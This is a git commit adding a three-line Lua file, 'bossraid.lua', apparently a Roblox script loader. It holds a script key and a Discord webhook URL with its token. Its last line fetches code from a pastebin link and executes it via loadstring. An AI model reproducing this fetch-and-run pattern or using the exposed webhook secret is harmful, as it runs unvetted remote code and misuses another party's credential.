391738d63cecaa183ae8c23ee00b422835ab94a6
rave <143023293+ravefrr@users.noreply.github.com>
2024-05-12 16:12:36 +0200

    Create bossraid.lua

---
+++ bossraid.lua
@@ -0,0 +1,3 @@
+script_key = "NQNSaadHszxEwzPKiCUcMEOREVelJrli"; 
+webhook_id = "https://discord.com/api/webhooks/1239216683130945630/Qcr-INvmK98Ay0Xb9w2TvcRLYd2nOCu0h-SUbpTKfZfn8EL4ma5M1GfFQV1pAsU2x3PA"; 
+loadstring(game:HttpGet("https://pastebin.com/raw/eAhJK8QY"))()
